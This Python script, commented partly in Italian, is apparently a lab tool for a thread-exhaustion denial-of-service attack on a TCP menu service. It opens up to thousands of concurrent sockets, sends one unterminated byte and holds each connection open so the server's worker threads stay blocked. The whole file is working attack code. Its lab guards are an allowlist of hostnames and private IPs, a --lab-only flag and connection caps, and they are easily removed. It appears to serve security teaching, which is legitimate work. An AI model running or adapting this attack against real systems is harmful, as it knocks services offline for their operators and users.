#!/usr/bin/env python3

import argparse
import ipaddress
import socket
import sys
import time
from queue import Queue
from threading import Thread

# Limiti di sicurezza accademici estesi per stress test massivo
MAX_CONNECTIONS = 5000
MAX_DURATION = 300
MAX_WORKERS = 1000

ALLOWED_HOSTNAMES = {"server", "victim", "target"}

def is_allowed_target(host: str) -> bool:
    if host in ALLOWED_HOSTNAMES:
        return True
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback
    except ValueError:
        return False

def attack_worker(queue, target_host, target_port, duration):
    """
    Worker ottimizzato per l'apertura a raffica di socket e il mantenimento
    dello stato di blocco (exhaustion) sul recv() del server.
    """
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            item = queue.get(timeout=0.1)
        except:
            continue

        if item is None:
            queue.task_done()
            break

        sock = None
        try:
            # Creazione socket con ottimizzazioni per alta frequenza
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(2.0) # Aggressive client-side timeout to keep the test responsive.
            
            # Connessione immediata
            sock.connect((target_host, target_port))
            
            # Legge parzialmente lo stream iniziale del menu per sbloccare l'invio
            # ma non svuota completamente il buffer, mantenendo il thread del server appeso
            try:
                sock.recv(64)
            except socket.timeout:
                pass

            # Send an incomplete selection without line terminators.
            # Questo costringe conn.recv(1024) su service.py ad attendere nel blocco try per 10 secondi.
            sock.send(b"1") 

            # Keep the socket open until the attack window ends or the server
            # enforces its 10-second timeout.
            remaining = end_time - time.time()
            if remaining > 0:
                time.sleep(min(8.5, remaining)) 

        except (OSError, socket.error):
            # Ignore refused connections, which indicate that the backlog is saturated.
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
            queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="High-density controlled attack simulator (thread exhaustion)")
    parser.add_argument("target_host", help="IP o Hostname del server target")
    parser.add_argument("target_port", type=int, help="Porta TCP del servizio (es. 9000)")
    parser.add_argument("-c", "--connections", type=int, default=1500, help="Total number of connections to create")
    parser.add_argument("-w", "--workers", type=int, default=500, help="Numero di thread concorrenti sull'attaccante")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--lab-only", action="store_true", help="Confirmation of authorized lab-only use")

    args = parser.parse_args()

    if not args.lab_only or not is_allowed_target(args.target_host):
        print("[ERROR] Unauthorized target or missing --lab-only parameter.")
        return

    if args.connections > MAX_CONNECTIONS or args.workers > MAX_WORKERS:
        print("[ERROR] Parameters exceed the lab safety limits.")
        return

    print(f"[*] ATTACCO AVVIATO su {args.target_host}:{args.target_port}")
    print(f"[*] Configuration: {args.workers} workers will send {args.connections} suspended connections...")

    queue = Queue()
    worker_threads = []

    # Create the attack thread pool immediately.
    for _ in range(args.workers):
        t = Thread(target=attack_worker, args=(queue, args.target_host, args.target_port, args.duration), daemon=True)
        t.start()
        worker_threads.append(t)

    # Iniezione massiva dei task nella coda per minimizzare i tempi morti di esecuzione
    start_time = time.time()
    for i in range(args.connections):
        queue.put(i)

    # Segnale di terminazione per i worker
    for _ in range(args.workers):
        queue.put(None)

    try:
        queue.join()
    except KeyboardInterrupt:
        print("\n[!] Manual interruption requested.")

    elapsed = time.time() - start_time
    print(f"[*] Attack completed in {elapsed:.2f} seconds. Check the server error logs.")

if __name__ == "__main__":
    main()
